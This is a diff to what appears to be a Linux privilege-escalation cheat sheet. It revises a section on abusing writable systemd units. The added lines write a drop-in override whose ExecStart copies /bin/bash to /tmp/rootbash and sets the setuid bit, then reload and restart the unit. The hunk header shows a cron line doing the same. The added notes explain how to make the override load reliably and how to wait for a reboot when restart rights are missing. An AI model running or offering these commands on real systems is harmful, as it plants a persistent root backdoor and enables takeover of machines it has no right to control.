@@ -25,10 +25,12 @@ printf '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' > /
 
 ## systemd unit: write + restart
 ```bash
-printf '[Service]\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"\n' >> /etc/systemd/system/<UNIT>.service
+mkdir -p /etc/systemd/system/<UNIT>.service.d
+printf '[Service]\nExecStart=\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"\n' > /etc/systemd/system/<UNIT>.service.d/override.conf
 systemctl daemon-reload
 systemctl restart <UNIT>
 ```
+- Drop-in: the empty `ExecStart=` clears the original first. Writable unit file itself: replace its `ExecStart=` line, don't append a second one (only `Type=oneshot` accepts several; otherwise the unit fails to load).
 - No restart rights → the unit runs your version on its own next restart or at boot; check `WantedBy=`/timer schedule instead of forcing it.
 - `ExecStart=` has no shell: wrap in `/bin/bash -c "..."` for pipes/redirects/chaining.
 
